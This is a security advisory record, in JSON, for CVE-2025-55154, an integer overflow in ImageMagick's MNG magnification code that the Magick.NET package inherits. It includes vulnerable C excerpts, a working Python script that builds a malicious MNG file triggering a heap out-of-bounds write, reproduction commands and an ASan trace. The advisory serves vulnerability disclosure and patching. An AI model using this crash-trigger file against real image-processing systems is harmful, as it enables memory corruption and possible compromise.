{
  "Severity": "HIGH",
  "UpdatedAt": "2025-08-25T16:23:12Z",
  "Package": {
    "Ecosystem": "NUGET",
    "Name": "Magick.NET-Q16-arm64"
  },
  "Advisory": {
    "DatabaseId": 308860,
    "Id": "GSA_kwCzR0hTQS1xcDI5LXd4cDUtd2g4Ms4ABLZ8",
    "GhsaId": "GHSA-qp29-wxp5-wh82",
    "References": [
      {
        "Url": "https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-qp29-wxp5-wh82"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-55154"
      },
      {
        "Url": "https://github.com/dlemstra/Magick.NET/releases/tag/14.8.0"
      },
      {
        "Url": "https://goo.gle/bigsleep"
      },
      {
        "Url": "https://github.com/advisories/GHSA-qp29-wxp5-wh82"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-qp29-wxp5-wh82"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-55154"
      }
    ],
    "Description": "## **Vulnerability Details**\n\nThe magnified size calculations in `ReadOneMNGIMage` (in `coders/png.c`) are unsafe and can overflow, leading to memory corruption.\n\nThe source snippet below is heavily abbreviated due to the size of the function, but hopefully the important points are captured.\n\n```c\nstatic Image *ReadOneMNGImage(MngReadInfo* mng_info,\n  const ImageInfo *image_info,ExceptionInfo *exception)\n{\n\n// Lots of stuff, this is effectively a state machine for the MNG rendering commands,\n// skip to the point where we start processing the \"MAGN\" command.\n\n        if (memcmp(type,mng_MAGN,4) == 0)\n          {\n            png_uint_16\n              magn_first,\n              magn_last,\n              magn_mb,\n              magn_ml,\n              magn_mr,\n              magn_mt,\n              magn_mx,\n              magn_my,\n              magn_methx,\n              magn_methy;\n\n// Details unimportant, but each of the `magn_xxx` variables is read from the file.\n\n            if (magn_first == 0 || magn_last == 0)\n              {\n                /* Save the magnification factors for object 0 */\n                mng_info-\u003emagn_mb=magn_mb;\n                mng_info-\u003emagn_ml=magn_ml;\n                mng_info-\u003emagn_mr=magn_mr;\n                mng_info-\u003emagn_mt=magn_mt;\n                mng_info-\u003emagn_mx=magn_mx;\n                mng_info-\u003emagn_my=magn_my;\n                mng_info-\u003emagn_methx=magn_methx;\n                mng_info-\u003emagn_methy=magn_methy;\n              }\n          }\n\n// Details unimportant, we load the image to be scaled and store it in `image`\n\n    if (mng_type)\n      {\n        MngBox\n          crop_box;\n\n        if (((mng_info-\u003emagn_methx \u003e 0) \u0026\u0026 (mng_info-\u003emagn_methx \u003c= 5)) \u0026\u0026\n            ((mng_info-\u003emagn_methy \u003e 0) \u0026\u0026 (mng_info-\u003emagn_methy \u003c= 5)))\n          {\n            png_uint_32\n               magnified_height,\n               magnified_width;\n\n            if (logging != MagickFalse)\n              (void) LogMagickEvent(CoderEvent,GetMagickModule(),\n                \"  Processing MNG MAGN chunk\");\n\n            if (image-\u003ecolumns == 1)\n              mng_info-\u003emagn_methx = 1;\n            if (image-\u003erows == 1)\n              mng_info-\u003emagn_methy = 1;\n            if (mng_info-\u003emagn_methx == 1)\n              {\n                magnified_width=mng_info-\u003emagn_ml; // [0]\n                \n                if (image-\u003ecolumns \u003e 1)\n                   magnified_width += mng_info-\u003emagn_mr; // [1]\n\n                if (image-\u003ecolumns \u003e 2)\n                   magnified_width += (png_uint_32)\n                      ((image-\u003ecolumns-2)*(mng_info-\u003emagn_mx)); // [2]\n               }\n\n// Different cases handle available scaling kinds, all of which have similar issues...\n\n// We now check whether the output image is larger than the input image in either\n// dimension, and if so, we will allocate a new image buffer of size\n// `magnified_width * magnified_height`.\n\n            if (magnified_height \u003e image-\u003erows ||\n                magnified_width \u003e image-\u003ecolumns)\n              {\n                Image\n                  *large_image;\n\n// Snip...\n\n                large_image-\u003ecolumns=magnified_width;\n                large_image-\u003erows=magnified_height;\n\n                magn_methx=mng_info-\u003emagn_methx;\n                magn_methy=mng_info-\u003emagn_methy;\n\n// In between here, we allocate the pixel buffer for `large_image`.\n\n                /* magnify the rows into the right side of the large image */\n\n                if (logging != MagickFalse)\n                  (void) LogMagickEvent(CoderEvent,GetMagickModule(),\n                    \"    Magnify the rows to %.20g\",\n                    (double) large_image-\u003erows);\n                m=(ssize_t) mng_info-\u003emagn_mt;\n                yy=0;\n                length=(size_t) GetPixelChannels(image)*image-\u003ecolumns;\n                next=(Quantum *) AcquireQuantumMemory(length,sizeof(*next));\n                prev=(Quantum *) AcquireQuantumMemory(length,sizeof(*prev));\n\n                if ((prev == (Quantum *) NULL) ||\n                    (next == (Quantum *) NULL))\n                  {\n                    if (prev != (Quantum *) NULL)\n                      prev=(Quantum *) RelinquishMagickMemory(prev);\n                    if (next != (Quantum *) NULL)\n                      next=(Quantum *) RelinquishMagickMemory(next);\n                    image=DestroyImageList(image);\n                    ThrowReaderException(ResourceLimitError,\n                      \"MemoryAllocationFailed\");\n                  }\n\n                n=GetAuthenticPixels(image,0,0,image-\u003ecolumns,1,exception);\n                (void) memcpy(next,n,length);\n\n                for (y=0; y \u003c (ssize_t) image-\u003erows; y++)\n                {\n                  if (y == 0)\n                    m=(ssize_t) mng_info-\u003emagn_mt;\n\n                  else if (magn_methy \u003e 1 \u0026\u0026 y == (ssize_t) image-\u003erows-2)\n                    m=(ssize_t) mng_info-\u003emagn_mb;\n\n                  else if (magn_methy \u003c= 1 \u0026\u0026 y == (ssize_t) image-\u003erows-1)\n                    m=(ssize_t) mng_info-\u003emagn_mb;\n\n                  else if (magn_methy \u003e 1 \u0026\u0026 y == (ssize_t) image-\u003erows-1)\n                    m=1;\n\n                  else\n                    m=(ssize_t) mng_info-\u003emagn_my;\n\n                  n=prev;\n                  prev=next;\n                  next=n;\n\n                  if (y \u003c (ssize_t) image-\u003erows-1)\n                    {\n                      n=GetAuthenticPixels(image,0,y+1,image-\u003ecolumns,1,\n                          exception);\n                      (void) memcpy(next,n,length);\n                    }\n\n                  for (i=0; i \u003c m; i++, yy++)\n                  {\n                    Quantum\n                      *pixels;\n\n                    assert(yy \u003c (ssize_t) large_image-\u003erows);\n                    pixels=prev;\n                    n=next;\n                    q=GetAuthenticPixels(large_image,0,yy,large_image-\u003ecolumns,\n                      1,exception);\n                    if (q == (Quantum *) NULL)\n                      break;\n                    q+=(ptrdiff_t) (large_image-\u003ecolumns-image-\u003ecolumns)*\n                      GetPixelChannels(large_image); // [3]\n```\n\nIf we look at the calculation for `magnified_width`, we can see that we are storing the results in a `png_uint32`. The operations at \\[0\\] and \\[1\\] are safe, since `mng_info-\u003emagn_ml` and `mng_info-\u003emagn_mx` are both 16-bit unsigned integers, but both the multiplication at \\[2\\] and the addition of the result of that multiplication to `magnified_width` can overflow, leading to a value of `magnified_width` that is smaller than required.\n\nWhen we then operate on the pixel buffers, we use the original parameters for the magnification, and we assume (reasonably?) that the output buffer is larger than the input buffer when calculating where to write the upsampled/magnified pixel values. Unfortunately, after the overflow has happened, this assumption is no longer true, and the calculation at \\[3\\] will end up with a `q` pointer outside the buffer bounds.\n\nThis issue leads to an out-of-bounds write of controlled data beyond the bounds of a heap allocation.\n\nTriggering this issue requires an `image` with large `columns` or `rows` (\\~65535) which should be prevented by all of the example security policies (which set `width`/`height` limits of `8KP`).\n\n## **Affected Version(s)**\n\nVerified on current HEAD (305e383c8ac7b30bc2ee96ab8c43ec96217ec2a9) and latest stable release (7.1.2-0).\n\n### **Build Instructions**\n\n```shell\ngit clone https://github.com/imagemagick/imagemagick\ncd imagemagick\n\nexport CC=clang\nexport CXX=clang++\nexport CFLAGS=\"-fsanitize=address\"\nexport CXXFLAGS=\"-fsanitize=address\"\nexport LDFLAGS=\"-fsanitize=address\"\n\n./configure --disable-shared --disable-docs --with-jxl\nmake -j\n```\n\n## **Reproduction**\n\n### **Test Case**\n\nThis testcase is a python script that will generate an MNG file with a MAGN chunk that triggers this overflow leading to an out-of-bounds heap write.\n\n```\nimport struct\nimport zlib\n\ndef create_chunk(chunk_type, data):\n    crc = zlib.crc32(chunk_type + data) \u0026 0xFFFFFFFF\n    return struct.pack('\u003eI', len(data)) + chunk_type + data + struct.pack('\u003eI', crc)\n\n# MNG signature\nmng_signature = b'\\x8aMNG\\r\\n\\x1a\\n'\n\n# --- Dimensions ---\nmhdr_width = 1\nmhdr_height = 1\nihdr_width = 65538 # W: Original width to cause W' overflow\nihdr_height = 1    # H: Original height\n\n# MHDR chunk (Valid small dimensions)\nmhdr_data = struct.pack('\u003eIIIIIII', mhdr_width, mhdr_height, 1, 0, 0, 0, 0)\nmhdr_chunk = create_chunk(b'MHDR', mhdr_data)\n\n# MAGN chunk: Trigger width overflow, force entry via height magn\nmagn_first = 0\nmagn_last = 0\nmagn_methx = 1\nmagn_mx = 65535      # -\u003e magnified_width = 65534 (overflow)\nmagn_my = 2          # -\u003e magnified_height = 2 (magn_mt=2)\nmagn_ml = 65535\nmagn_mr = 65535\nmagn_mt = 2          # Force magnified_height \u003e H (necessary to trigger large_image path)\nmagn_mb = 1\nmagn_methy = 1\n\nmagn_data = struct.pack('\u003eHHBHHHHHHB',\n                        magn_first, magn_last,\n                        magn_methx,\n                        magn_mx, magn_my,\n                        magn_ml, magn_mr,\n                        magn_mt, magn_mb,\n                        magn_methy)\nmagn_chunk = create_chunk(b'MAGN', magn_data)\n\n# IHDR chunk\nihdr_data = struct.pack('\u003eIIBBBBB', ihdr_width, ihdr_height, 8, 0, 0, 0, 0)\nihdr_chunk = create_chunk(b'IHDR', ihdr_data)\n\n# IDAT chunk (Minimal data for W x H grayscale pixels)\nscanline = b'\\x00' + (b'\\x00' * ihdr_width)\ncompressed_scanline = zlib.compress(scanline)\nidat_chunk = create_chunk(b'IDAT', compressed_scanline)\n\n# IEND chunk\niend_chunk = create_chunk(b'IEND', b'')\n\n# MEND chunk\nmend_chunk = create_chunk(b'MEND', b'')\n\nprogram_input = (\n    mng_signature +\n    mhdr_chunk +\n    magn_chunk +\n    ihdr_chunk +\n    idat_chunk +\n    iend_chunk +\n    mend_chunk\n)\n\nprint(f\"Generated MNG size: {len(program_input)} bytes\")\nwith open(\"magn_write.mng\", \"wb\") as tmp:\n    tmp.write(program_input)\n```\n\n### **Command**\n\n```shell\npython3 ./generate_testcase.py\nutilities/magick ./magn_write.mng -resize 200x200 PNG:output.png\n```\n\n### **ASan Backtrace**\n\n```\n=================================================================\n==585863==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f80849757d0 at pc 0x55744124fba3 bp 0x7fff1300ddf0 sp 0x7fff1300dde8\nWRITE of size 4 at 0x7f80849757d0 thread T0\n    #0 0x55744124fba2 in SetPixelRed /tmp/repro/imagemagick/./MagickCore/pixel-accessor.h:913:52\n    #1 0x55744123be16 in ReadOneMNGImage /tmp/repro/imagemagick/coders/png.c:6657:27\n    #2 0x557441222c33 in ReadMNGImage /tmp/repro/imagemagick/coders/png.c:7341:9\n    #3 0x557441347da1 in ReadImage /tmp/repro/imagemagick/MagickCore/constitute.c:736:15\n    #4 0x55744134ad96 in ReadImages /tmp/repro/imagemagick/MagickCore/constitute.c:1078:9\n    #5 0x5574419135fc in CLINoImageOperator /tmp/repro/imagemagick/MagickWand/operation.c:4959:22\n    #6 0x55744190748c in CLIOption /tmp/repro/imagemagick/MagickWand/operation.c:5473:7\n    #7 0x5574417dd25b in ProcessCommandOptions /tmp/repro/imagemagick/MagickWand/magick-cli.c:653:13\n    #8 0x5574417de629 in MagickImageCommand /tmp/repro/imagemagick/MagickWand/magick-cli.c:1392:5\n    #9 0x5574417daf9c in MagickCommandGenesis /tmp/repro/imagemagick/MagickWand/magick-cli.c:177:14\n    #10 0x557440e237b9 in MagickMain /tmp/repro/imagemagick/utilities/magick.c:162:10\n    #11 0x557440e231e1 in main /tmp/repro/imagemagick/utilities/magick.c:193:10\n    #12 0x7f8087433ca7 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #13 0x7f8087433d64 in __libc_start_main csu/../csu/libc-start.c:360:3\n    #14 0x557440d3f790 in _start (/tmp/repro/imagemagick/utilities/magick+0x1f2790) (BuildId: 926b2c12732f27a214dada191ea6277c7b553ea5)\n\n0x7f80849757d0 is located 48 bytes before 1572816-byte region [0x7f8084975800,0x7f8084af57d0)\nallocated by thread T0 here:\n    #0 0x557440de00cb in posix_memalign (/tmp/repro/imagemagick/utilities/magick+0x2930cb) (BuildId: 926b2c12732f27a214dada191ea6277c7b553ea5)\n    #1 0x557440e58aa6 in AcquireAlignedMemory_POSIX /tmp/repro/imagemagick/MagickCore/memory.c:300:7\n    #2 0x557440e5885d in AcquireAlignedMemory /tmp/repro/imagemagick/MagickCore/memory.c:378:10\n    #3 0x5574412e9725 in OpenPixelCache /tmp/repro/imagemagick/MagickCore/cache.c:3775:46\n    #4 0x5574412eead7 in GetImagePixelCache /tmp/repro/imagemagick/MagickCore/cache.c:1782:18\n    #5 0x5574412ef71b in SyncImagePixelCache /tmp/repro/imagemagick/MagickCore/cache.c:5600:28\n    #6 0x557440e2e786 in SetImageStorageClass /tmp/repro/imagemagick/MagickCore/image.c:2617:10\n    #7 0x557440e2f075 in SetImageBackgroundColor /tmp/repro/imagemagick/MagickCore/image.c:2422:7\n    #8 0x55744123b3d6 in ReadOneMNGImage /tmp/repro/imagemagick/coders/png.c:6560:28\n    #9 0x557441222c33 in ReadMNGImage /tmp/repro/imagemagick/coders/png.c:7341:9\n    #10 0x557441347da1 in ReadImage /tmp/repro/imagemagick/MagickCore/constitute.c:736:15\n    #11 0x55744134ad96 in ReadImages /tmp/repro/imagemagick/MagickCore/constitute.c:1078:9\n    #12 0x5574419135fc in CLINoImageOperator /tmp/repro/imagemagick/MagickWand/operation.c:4959:22\n    #13 0x55744190748c in CLIOption /tmp/repro/imagemagick/MagickWand/operation.c:5473:7\n    #14 0x5574417dd25b in ProcessCommandOptions /tmp/repro/imagemagick/MagickWand/magick-cli.c:653:13\n    #15 0x5574417de629 in MagickImageCommand /tmp/repro/imagemagick/MagickWand/magick-cli.c:1392:5\n    #16 0x5574417daf9c in MagickCommandGenesis /tmp/repro/imagemagick/MagickWand/magick-cli.c:177:14\n    #17 0x557440e237b9 in MagickMain /tmp/repro/imagemagick/utilities/magick.c:162:10\n    #18 0x557440e231e1 in main /tmp/repro/imagemagick/utilities/magick.c:193:10\n    #19 0x7f8087433ca7 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/repro/imagemagick/./MagickCore/pixel-accessor.h:913:52 in SetPixelRed\nShadow bytes around the buggy address:\n  0x7f8084975500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7f8084975580: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7f8084975600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7f8084975680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7f8084975700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n=\u003e0x7f8084975780: fa fa fa fa fa fa fa fa fa fa[fa]fa fa fa fa fa\n  0x7f8084975800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x7f8084975880: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x7f8084975900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x7f8084975980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x7f8084975a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==585863==ABORTING\n```\n\n## **Reporter Credit**\n\nGoogle Big Sleep",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-08-25T16:23:09Z",
    "Severity": "HIGH",
    "Summary": "imagemagick: integer overflows in MNG magnification",
    "UpdatedAt": "2025-08-25T16:23:13Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 8.8,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "14.8.0"
      },
      "VulnerableVersionRange": "\u003c 14.8.0"
    }
  ]
}